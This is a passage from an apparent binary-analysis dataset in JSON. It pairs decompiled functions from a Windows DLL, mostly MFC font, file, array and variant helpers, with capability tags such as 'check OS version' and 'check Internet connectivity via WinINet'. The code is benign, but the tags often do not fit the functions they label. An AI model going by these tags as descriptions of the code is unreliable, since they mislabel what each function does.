(auStack548[0] == 0x82) {\ncode_r0x000180026257:\n        if (*(arg1_00 + 0x38) == '\\0') {\n            iVar6 = *(arg1_00 + 0x28);\n            if (arg2_00 <= *(arg1_00 + 0x18) + -1 + *(iVar6 + 0x10)) {\n                puVar8 = arg2_00 - *(iVar6 + 0x10);\ncode_r0x00018002629e:\n                puVar7 = *(iVar6 + 8 + puVar8 * 0x50) + *(arg1_00 + 0x10);\n            }\n        }\n        else if (*(arg1_00 + 0x18) != 0) {\n            iVar6 = *(arg1_00 + 0x28);\n            puVar9 = iVar6 + 0x10;\n            puVar8 = puVar7;\n            do {\n                if (*puVar9 == arg2_00) goto code_r0x00018002629e;\n                puVar8 = puVar8 + 1;\n                puVar9 = puVar9 + 10;\n            } while (puVar8 < *(arg1_00 + 0x18));\n        }\n        puVar7 = fcn.1800087c4(&iStack448, puVar7);\n        uVar5 = fcn.18001daf0(auStack104, *puVar7);\n        fcn.18001d390(auStack544, uVar5);\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack104);\n        LOCK();\n        piVar1 = iStack448 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar2 + -1 < 1) {\n            (**(**(iStack448 + -0x18) + 8))();\n        }\n    }\n    else if (auStack548[0] == 0x83) {\n        cVar4 = fcn.180021678(arg1_00, arg2_00, &uStack56);\n        if (cVar4 != '\\0') {\n            dStack360 = iStack53;\n            for (; cStack55 != '\\0'; cStack55 = cStack55 + -1) {\n                dStack360 = dStack360 / *0x180051c08;\n            }\n            if (cStack54 == '\\0') {\n                dStack360 = *0x180051c00 - dStack360;\n            }\n            auStack368[0] = 5;\n            fcn.18001d390(auStack544, auStack368);\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack368);\n        }\n    }\n    else if (auStack548[0] == 0x85) {\n        cVar4 = fcn.180021704(arg1_00, arg2_00, &iStack512);\n        if (cVar4 != '\\0') {\n            uStack480 = 0;\n            uStack472 = 0;\n            uStack568 = 0;\n            uStack576 = 0;\n            uStack584 = 0;\n            fcn.18001d6a8(&uStack480, iStack512, uStack510, uStack508);\n            auStack248[0] = 7;\n            uStack240 = uStack480;\n            fcn.18001d390(auStack544, auStack248);\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack248);\n        }\n    }\n    else if (auStack548[0] == 0x86) {\n        cVar4 = fcn.180021704(arg1_00, arg2_00, &uStack520);\n        if (cVar4 != '\\0') {\n            uStack464 = 0;\n            uStack456 = 0;\n            uStack568 = uStack516;\n            uStack576 = uStack518;\n            uStack584 = uStack520;\n            fcn.18001d6a8(&uStack464, 0x76b, 0xc, 0x1e);\n            auStack416[0] = 7;\n            uStack408 = uStack464;\n            fcn.18001d390(auStack544, auStack416);\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack416);\n        }\n    }\n    else if ((auStack548[0] == 0x87) && (cVar4 = fcn.180021780(arg1_00, arg2_00, &iStack504),  cVar4 != '\\0')) {\n        uStack568 = uStack494;\n        uStack576 = uStack496;\n        uStack584 = uStack498;\n        fcn.18001d6a8(auStack216, iStack504, uStack502, uStack500);\n        auStack296[0] = 7;\n        uStack288 = auStack216[0];\n        fcn.18001d390(auStack544, auStack296);\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack296);\n    }\n    fcn.18001d734(arg2, auStack544);\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack544);\ncode_r0x000180026334:\n    fcn.180032ea0(uStack32 ^ auStack616);\n    return;\n}\n",
        "token_count": 5381
    },
    "180026cf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nbool fcn.180026cf8(int32_t *arg1)\n\n{\n    return *arg1 != 2;\n}\n",
        "token_count": 27
    },
    "180026e5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nbool fcn.180026e58(int64_t arg1, ulong arg2, uint64_t arg3, int32_t *arg4)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong *arg2_00;\n    int64_t **ppiVar4;\n    bool bVar5;\n    ulong in_stack_00000028;\n    uint32_t in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    uint in_stack_00000048;\n    int64_t **in_stack_00000068;\n    uint64_t uVar6;\n    int64_t *piStack72;\n    ulong uStack64;\n    \n    uStack64 = 0xfffffffffffffffe;\n    piStack72 = NULL;\n    uVar6 = arg3;\n    iVar2 = (**(**(arg1 + 0x40) + 0x260))(*(arg1 + 0x40), arg1, &piStack72, in_stack_00000048, arg3);\n    if ((iVar2 != 0) && (piStack72 == NULL)) {\n        iVar3 = fcn.180014058();\n        if (*(iVar3 + 0x68) == 0) {\n            fcn.180012514();\n        }\n        iVar3 = fcn.180014058();\n        piStack72 = (**(**(iVar3 + 0x68) + 0x18))(*(iVar3 + 0x68), arg1, arg4);\n    }\n    if (piStack72 == NULL) {\n        bVar5 = false;\n    }\n    else {\n        if (*arg4 == 2) {\n            iVar2 = (**(*piStack72 + 0xa0))\n                              (piStack72, arg2, arg3, in_stack_00000028, uVar6 & 0xffffffff00000000 | in_stack_00000030\n                               , in_stack_00000038, in_stack_00000040);\n        }\n        else {\n            iVar2 = fcn.18001deec(piStack72, arg2, arg4, in_stack_00000030);\n        }\n        bVar5 = -1 < iVar2;\n        if (bVar5) {\n            arg2_00 = fcn.180009660(0x18);\n            if (arg2_00 == NULL) {\n                arg2_00 = NULL;\n            }\n            else {\n                *arg2_00 = 0;\n                arg2_00[1] = piStack72;\n                *(arg2_00 + 2) = 0;\n            }\n            fcn.18002d7a4(arg1 + 0x80, arg2_00);\n            piVar1 = piStack72;\n            if (piStack72[9] != 0) {\n                ppiVar4 = fcn.18002d358(arg1 + 0x48, piStack72[9]);\n                *ppiVar4 = piVar1;\n            }\n            if (in_stack_00000068 != NULL) {\n                *in_stack_00000068 = piStack72;\n            }\n        }\n        else if (piStack72 != NULL) {\n            (**(*piStack72 + 8))(piStack72, 1);\n        }\n    }\n    return bVar5;\n}\n",
        "token_count": 729
    },
    "180027f5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180027f5c(int64_t arg1, code **arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar auStack264 [32];\n    code *pcStack232;\n    int64_t iStack224;\n    int64_t iStack216;\n    uint auStack208 [2];\n    int64_t iStack200;\n    int32_t iStack192;\n    uint uStack188;\n    ushort uStack184;\n    uint16_t uStack182;\n    uint32_t uStack180;\n    uint32_t uStack176;\n    uint32_t uStack172;\n    ulong uStack168;\n    uchar auStack160 [16];\n    ulong uStack144;\n    int32_t aiStack120 [4];\n    ushort uStack104;\n    uint8_t uStack100;\n    uint8_t uStack99;\n    uint8_t uStack98;\n    uint8_t uStack97;\n    uchar auStack92 [68];\n    uint64_t uStack24;\n    \n    uStack168 = 0xfffffffffffffffe;\n    uStack24 = *0x180067ce0 ^ auStack264;\n    iStack224 = 0;\n    pcStack232 = vtable.CFont.0;\n    if ((arg2 == NULL) || (arg2[1] == NULL)) {\n        iStack224 = (*_sym.imp.GDI32.dll_GetStockObject)(0x11);\n        if (iStack224 == 0) {\n            iStack224 = (*_sym.imp.GDI32.dll_GetStockObject)(0xd);\n            if (iStack224 == 0) {\n                *(arg1 + 0xc0) = 0;\n                pcStack232 = vtable.CFont.0;\n                fcn.1800134f8(&pcStack232);\n                goto code_r0x000180028120;\n            }\n        }\n        arg2 = &pcStack232;\n    }\n    (*_sym.imp.GDI32.dll_GetObjectW)(arg2[1], 0x5c, aiStack120);\n    auStack208[0] = 0x28;\n    fcn.1800087c4(&iStack216, auStack92);\n    iStack200 = iStack216;\n    uStack184 = uStack104;\n    uStack182 = uStack97;\n    uStack180 = uStack100;\n    uStack176 = uStack99;\n    uStack172 = uStack98;\n    if (aiStack120[0] < 0) {\n        aiStack120[0] = -aiStack120[0];\n    }\n    fcn.1800130c4(auStack160, *(arg1 + 0x40));\n    iStack192 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uStack144);\n    iStack192 = (aiStack120[0] * 720000) / iStack192;\n    uStack188 = 0;\n    fcn.18001cf70(arg1 + 0xc0);\n    iVar2 = (*_sym.imp.OLEAUT32.dll_OleTranslateColor)(auStack208, 0x1800561f8, arg1 + 0xc0);\n    if (iVar2 < 0) {\n        *(arg1 + 0xc0) = 0;\n    }\n    fcn.180013128(auStack160);\n    LOCK();\n    piVar1 = iStack216 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iStack216 + -0x18) + 8))();\n    }\n    pcStack232 = vtable.CFont.0;\n    fcn.1800134f8(&pcStack232);\ncode_r0x000180028120:\n    fcn.180032ea0(uStack24 ^ auStack264);\n    return;\n}\n",
        "token_count": 855
    },
    "180028e1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180028e14(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.180014058();\n    if (*(iVar2 + 0x54) == 0) {\n        iVar2 = fcn.180014058();\n        *(iVar2 + 0x54) = 1;\n        iVar2 = fcn.180014058();\n        iVar2 = *(iVar2 + 8);\n        if ((iVar2 == 0) || (*(iVar2 + 0x40) == 0)) {\n            iVar2 = fcn.180014058();\n            if (*(iVar2 + 0x28) == '\\0') {\n                fcn.18000db00(0);\n            }\n        }\n        else {\n            iVar1 = fcn.18001bea8(*(iVar2 + 0x40));\n            if (iVar1 != 0) {\n                (**(**(iVar2 + 0x40) + 0xc0))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "1800295d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.1800295dc(code **arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uchar auStack1128 [56];\n    code **ppcStack1072;\n    ulong uStack1056;\n    uint64_t uStack24;\n    \n    uStack1056 = 0xfffffffffffffffe;\n    uStack24 = *0x180067ce0 ^ auStack1128;\n    *arg1 = vtable.CFile.0;\n    ppcStack1072 = arg1;\n    if ((arg1[1] != 0xffffffffffffffff) && (*(arg1 + 2) != 0)) {\n        fcn.180029308(arg1, arg2);\n    }\n    pcVar3 = arg1[3];\n    LOCK();\n    piVar1 = pcVar3 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar3 + -0x18) + 8))();\n    }\n    fcn.180032ea0(uStack24 ^ auStack1128);\n    return;\n}\n",
        "token_count": 272
    },
    "18002aa4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t * fcn.18002aa4c(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int64_t *piVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    int32_t iVar9;\n    ulong *puVar10;\n    int64_t *piVar11;\n    \n    piVar11 = NULL;\n    piVar5 = fcn.18002a828(arg1, arg2);\n    piVar8 = piVar5;\n    if ((piVar5 == NULL) && (iVar6 = fcn.180015b74(arg1),  iVar6 != 0)) {\n        puVar10 = *(iVar6 + 0x88);\n        while (piVar8 = piVar5,  puVar10 != NULL) {\n            puVar1 = *puVar10;\n            piVar8 = puVar10[2];\n            if (((piVar8[1] != 0) && (piVar8[1] == *(iVar6 + 0xd8))) ||\n               ((puVar10 = puVar1,  *piVar8 != 0 && (iVar7 = (*_sym.imp.USER32.dll_GetFocus)(),  *piVar8 == iVar7))))\n            break;\n        }\n    }\n    iVar9 = 0;\n    do {\n        piVar8 = fcn.18002a888(arg1, piVar8, arg3);\n        if (piVar8 == NULL) {\n            return NULL;\n        }\n        iVar3 = fcn.18002a150(piVar8);\n        if ((iVar3 != 0) && (piVar8 = fcn.18001c144(arg1, piVar8, 0),  piVar8 == NULL)) {\n            return NULL;\n        }\n        if (piVar8 == NULL) {\ncode_r0x00018002ab33:\n            if (piVar8[1] == 0) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                piVar8 = (*pcVar2)();\n                return piVar8;\n            }\n            uVar4 = (**(*piVar8[1] + 0xf0))();\n            uVar4 = uVar4 >> 0x1b & 1;\n        }\n        else {\n            if (piVar8[1] == 0) {\n                iVar6 = *piVar8;\n            }\n            else {\n                iVar6 = *(piVar8[1] + 0x48);\n            }\n            if (iVar6 == 0) goto code_r0x00018002ab33;\n            uVar4 = (*_sym.imp.USER32.dll_IsWindowEnabled)();\n        }\n        if (uVar4 == 0) {\n            return piVar8;\n        }\n        if (piVar8 == piVar11) {\n            return NULL;\n        }\n        if (piVar11 == NULL) {\n            piVar11 = piVar8;\n        }\n        iVar9 = iVar9 + 1;\n        if (0x1ff < iVar9) {\n            return NULL;\n        }\n    } while( true );\n}\n",
        "token_count": 714
    },
    "18002b47": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18002b478(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int64_t *apiStackX8 [4];\n    \n    *(arg1 + 0x30) = 0;\n    if (*(arg1 + 0x24) == 0) {\n        fcn.1800096a4(*(arg1 + 0x48));\n        *(arg1 + 0x48) = 0;\n        *(arg1 + 0x38) = 0;\n    }\n    if (*(arg1 + 0x60) != 0) {\n        iVar2 = fcn.18002d158(*(arg1 + 0x60), 1, apiStackX8);\n        if ((iVar2 != 0) && (apiStackX8[0] != NULL)) {\n            (**(*apiStackX8[0] + 8))(apiStackX8[0], 1);\n        }\n    }\n    piVar1 = *(arg1 + 0x60);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1);\n    }\n    piVar1 = *(arg1 + 0x58);\n    *(arg1 + 0x60) = 0;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1);\n    }\n    *(arg1 + 0x58) = 0;\n    return;\n}\n",
        "token_count": 335
    },
    "18002bf4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong * fcn.18002bf40(ulong *arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int64_t *piVar4;\n    ulong *puVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    int32_t iVar9;\n    ulong in_stack_00000028;\n    int64_t iStack40;\n    ulong uStack32;\n    \n    uStack32 = 0xfffffffffffffffe;\n    piVar4 = fcn.180012330();\n    if (piVar4 == NULL) {\n        fcn.180001214(0x80004005);\n        pcVar2 = swi(3);\n        puVar5 = (*pcVar2)();\n        return puVar5;\n    }\n    iVar6 = (**(*piVar4 + 0x18))(piVar4);\n    arg1[3] = iVar6 + 0x18;\n    if (arg2 == NULL) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        puVar5 = (*pcVar2)();\n        return puVar5;\n    }\n    uVar7 = (**(*arg2 + 0x30))(arg2, &iStack40);\n    fcn.180008c54(arg1 + 3, uVar7);\n    LOCK();\n    piVar1 = iStack40 + -8;\n    iVar9 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar9 + -1 < 1) {\n        (**(**(iStack40 + -0x18) + 8))();\n    }\n    *(arg1 + 4) = arg3;\n    arg1[6] = arg2;\n    arg1[0xc] = 0;\n    arg1[0xb] = 0;\n    *arg1 = 0;\n    *(arg1 + 1) = 1;\n    *(arg1 + 0x14) = 0xffffffff;\n    *(arg1 + 0xd) = (-((~arg3 & 1) != 0) & 0xffffffd0) + 0x40;\n    *(arg1 + 0x6c) = 0x89;\n    arg1[9] = in_stack_00000028;\n    *(arg1 + 0x24) = 1;\n    *(arg1 + 0xc) = 0;\n    uVar3 = (**(*arg2 + 0xa0))(arg2, 3, 0, 0, 0);\n    *(arg1 + 2) = uVar3 & 2;\n    if (arg4 < 0x80) {\n        *(arg1 + 5) = 0x80;\n        arg1[9] = 0;\n    }\n    else {\n        *(arg1 + 5) = arg4;\n    }\n    iVar9 = *(arg1 + 5);\n    if (arg1[9] == 0) {\n        uVar3 = (**(*arg1[6] + 0xa0))(arg1[6], 3, 0, 0, 0);\n        *(arg1 + 0xc) = uVar3 & 1;\n        if ((uVar3 & 1) == 0) {\n            uVar7 = fcn.180009660(*(arg1 + 5));\n            arg1[9] = uVar7;\n            *(arg1 + 0x24) = 0;\n        }\n        else {\n            iVar9 = 0;\n        }\n    }\n    iVar8 = iVar9 + arg1[9];\n    arg1[8] = iVar8;\n    iVar6 = arg1[9];\n    if ((*(arg1 + 4) & 1) != 0) {\n        iVar6 = iVar8;\n    }\n    arg1[7] = iVar6;\n    return arg1;\n}\n",
        "token_count": 888
    },
    "18002c3e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18002c3ec(int64_t *arg1)\n\n{\n    arg1[4] = 0;\n    arg1[5] = 0;\n    arg1[6] = 0;\n    arg1[7] = 0;\n    if ((arg1[8] != 0) && (*(arg1 + 9) != 0)) {\n        (**(*arg1 + 0xc0))();\n    }\n    arg1[8] = 0;\n    return;\n}\n",
        "token_count": 111
    },
    "18002c80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.18002c800(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t iStackX8;\n    int64_t iStackX16;\n    uchar auStackX24 [8];\n    \n    if (arg1 != 0) {\n        iStackX16 = -(*(arg1 + 0x80) != 0);\n        while (iStackX16 != 0) {\n            fcn.18002d1ec(arg1 + 0x68, &iStackX16, auStackX24, &iStackX8);\n            iVar1 = *(arg1 + 0xa8);\n            *(iStackX8 + iVar1) = 0;\n            if (*(arg1 + 0xb0) == 2) {\n                *(iStackX8 + 8 + iVar1) = 0;\n            }\n            (**(arg1 + 0x28))(iStackX8);\n        }\n        fcn.18002d09c(arg1 + 0x68);\n        fcn.180030f88(arg1 + 8);\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "18002d2e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18002d2ec(int64_t arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    \n    if (*(arg1 + 0x20) == 0) {\n        iVar3 = fcn.18002a0c8(arg1 + 0x28, *(arg1 + 0x30), 0x18);\n        iVar1 = *(arg1 + 0x30);\n        puVar4 = iVar3 + -0x10 + iVar1 * 0x18;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar4 = *(arg1 + 0x20);\n            *(arg1 + 0x20) = puVar4;\n            puVar4 = puVar4 + -3;\n        }\n    }\n    puVar4 = *(arg1 + 0x20);\n    uVar2 = *puVar4;\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    *(arg1 + 0x20) = uVar2;\n    puVar4[1] = 0;\n    puVar4[2] = 0;\n    return;\n}\n",
        "token_count": 285
    },
    "18002d40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18002d404(int64_t *pvarg, uint *arg2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    uVar2 = *0x18006d278;\n    uVar3 = *0x18006d27c;\n    if (pvarg != NULL) {\n        iVar1 = (*_sym.imp.GDI32.dll_GetMapMode)(pvarg[2]);\n        if ((iVar1 < 7) && (iVar1 != 1)) {\n            (**(*pvarg + 0x68))(pvarg, 3);\n            fcn.180012d78(pvarg, arg2);\n            (**(*pvarg + 0x68))(pvarg, iVar1);\n            return;\n        }\n        uVar2 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(pvarg[2], 0x58);\n        uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(pvarg[2], 0x5a);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg2, 0x9ec, uVar2);\n    *arg2 = uVar2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_MulDiv)(arg2[1], 0x9ec, uVar3);\n    arg2[1] = uVar2;\n    return;\n}\n",
        "token_count": 314
    },
    "18002d4c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18002d4c4(int64_t *pvarg, uint *arg2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    uVar2 = *0x18006d278;\n    uVar3 = *0x18006d27c;\n    if (pvarg != NULL) {\n        iVar1 = (*_sym.imp.GDI32.dll_GetMapMode)(pvarg[2]);\n        if ((iVar1 < 7) && (iVar1 != 1)) {\n            (**(*pvarg + 0x68))(pvarg, 3);\n            fcn.180012cf4(pvarg, arg2);\n            (**(*pvarg + 0x68))(pvarg, iVar1);\n            return;\n        }\n        uVar2 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(pvarg[2], 0x58);\n        uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(pvarg[2], 0x5a);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg2, uVar2, 0x9ec);\n    *arg2 = uVar2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_MulDiv)(arg2[1], uVar3, 0x9ec);\n    arg2[1] = uVar2;\n    return;\n}\n",
        "token_count": 316
    },
    "18002d6d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18002d6dc(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    \n    if (*(arg1 + 0x20) == 0) {\n        iVar2 = fcn.18002a0c8(arg1 + 0x28, *(arg1 + 0x30), 0x18);\n        iVar1 = *(arg1 + 0x30);\n        puVar3 = iVar2 + -0x10 + iVar1 * 0x18;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar3 = *(arg1 + 0x20);\n            *(arg1 + 0x20) = puVar3;\n            puVar3 = puVar3 + -3;\n        }\n    }\n    puVar3 = *(arg1 + 0x20);\n    *(arg1 + 0x20) = *puVar3;\n    puVar3[1] = arg2;\n    *puVar3 = arg3;\n    *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    puVar3[2] = 0;\n    return;\n}\n",
        "token_count": 287
    },
    "18002dd2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18002dd2c(ulong *arg1)\n\n{\n    if (*(arg1 + 2) != 0) {\n        fcn.1800096a4(*arg1);\n    }\n    return;\n}\n",
        "token_count": 50
    },
    "18002e14": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18002e148(code **arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    \n    *arg1 = vtable.CArray_class_CVariantBoolPair__class_CVariantBoolPair_const____ptr64_.0;\n    if (arg1[1] != NULL) {\n        iVar1 = 0;\n        if (0 < arg1[2]) {\n            iVar2 = 0;\n            do {\n                if (*(arg1[1] + iVar2 + 0x10) != 0) {\n                    fcn.1800096a4(*(arg1[1] + iVar2));\n                }\n                iVar1 = iVar1 + 1;\n                iVar2 = iVar2 + 0x18;\n            } while (iVar1 < arg1[2]);\n        }\n        fcn.1800096a4(arg1[1]);\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "18002e23": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18002e23c(int64_t arg1, int64_t arg2, ulong *arg3)\n\n{\n    ulong *puVar1;\n    ulong uVar2;\n    code *pcVar3;\n    \n    if (arg2 < 0) {\n        fcn.180012514();\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    if (*(arg1 + 0x10) <= arg2) {\n        fcn.18002dd44(arg1, arg2 + 1, 0xffffffffffffffff);\n    }\n    puVar1 = *(arg1 + 8) + arg2 * 0x18;\n    if (puVar1 != arg3) {\n        uVar2 = *arg3;\n        if (*(arg3 + 2) != 0) {\n            *arg3 = 0;\n        }\n        *puVar1 = uVar2;\n        puVar1[1] = arg3[1];\n        *(puVar1 + 2) = *(arg3 + 2);\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "18002e32": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
